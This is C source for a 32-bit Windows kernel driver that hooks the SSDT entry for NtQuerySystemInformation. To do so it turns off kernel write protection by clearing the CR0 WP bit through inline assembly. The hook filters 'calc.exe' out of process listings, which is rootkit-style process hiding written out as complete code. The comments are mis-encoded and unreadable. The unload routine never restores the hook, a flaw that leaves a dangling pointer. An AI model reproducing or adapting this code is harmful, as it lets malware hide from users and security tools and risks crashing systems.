#include "DriverMain.h"

NTQUERYSYSTEMINFORMATION oldNtQuerySystemInformation;//ԭʼ������ַ
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject,PUNICODE_STRING RegistryPath)
{
	KdPrint(("DriverStart"));
	PKSYSTEM_SERVICE_TABLE ptrServiceTable = 0;//��������SSDT��ָ��
	ptrServiceTable = FindSSDTTable();
	//__debugbreak();
	KillProtect();//�ر�ֻ������
	oldNtQuerySystemInformation = (NTQUERYSYSTEMINFORMATION)ptrServiceTable->ServiceTableBase[0x105];//����ԭʼSSDT������ַ
	ptrServiceTable->ServiceTableBase[0x105]=(ULONG)MyZwQuerySystemInformation;
	StartProtect();//����ֻ������

	DriverObject->DriverUnload = UnLoadDriver;
	return STATUS_SUCCESS;
}
/*��ȡSSDT��ַ*/
PKSYSTEM_SERVICE_TABLE FindSSDTTable()
{
	PETHREAD ptrKThread = PsGetCurrentThread();//��ȡKTHREAD
	PKSERVICE_TABLE_DESCRIPTOR ptrServiceTable =  (PKSERVICE_TABLE_DESCRIPTOR)( *(PULONG)((ULONG)ptrKThread + 0xbc) );//�̶�ƫ��ȡ����������
	PKSYSTEM_SERVICE_TABLE SSDT =  &(ptrServiceTable->ntoskrnl);
	KdPrint(("FindSSDT"));
	return SSDT;//SSDT
}
/*�ر�ֻ������*/
VOID  _declspec(naked) KillProtect()
{
	__asm
	{
		push eax;
		mov eax,cr0;
		and eax,~0x10000;//ȡ��
		mov cr0,eax;
		pop eax;
		ret;
	}
}
/*����ֻ������*/
VOID _declspec(naked) StartProtect()
{
	__asm
	{
		push eax;
		mov eax,cr0;
		or eax,0x10000;
		mov cr0,eax;
		pop eax;
		ret;
	}
}
/*�Լ���ZwQuerySystemInformation*/
NTSTATUS NTAPI MyZwQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass,PVOID SystemInformation,ULONG SystemInformationLength,PULONG ReturnLength)
{
	NTSTATUS rtStatus;
	rtStatus = oldNtQuerySystemInformation(SystemInformationClass,SystemInformation,SystemInformationLength,ReturnLength);
	if(NT_SUCCESS(rtStatus))
	{
		if(SystemInformationClass == SystemProcessInformation)//��ѯ���ǽ�����Ϣ
		{
			PSYSTEM_PROCESS_INFORMATION pcurr = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
			PSYSTEM_PROCESS_INFORMATION plast = NULL;//����
			WCHAR *tmp = L"calc.exe";
			while(TRUE)
			{
				
				if((PWSTR)pcurr->Reserved2[1] != NULL)
				{
					if(!wcscmp(tmp,(WCHAR*)pcurr->Reserved2[1]))
					{
						if(pcurr->NextEntryOffset == 0)
							plast->NextEntryOffset = 0;
						else
							plast->NextEntryOffset += pcurr->NextEntryOffset;
					}
					else
						plast = pcurr;
				}
				if(pcurr->NextEntryOffset == 0)
				{
					break;
				}
				pcurr = (PSYSTEM_PROCESS_INFORMATION)((ULONG)pcurr + pcurr->NextEntryOffset);

			}
		}
	}
	
	return rtStatus;
}
VOID UnLoadDriver(PDRIVER_OBJECT pDriverObject)
{
	KdPrint(("UnloadDriver success!"));
}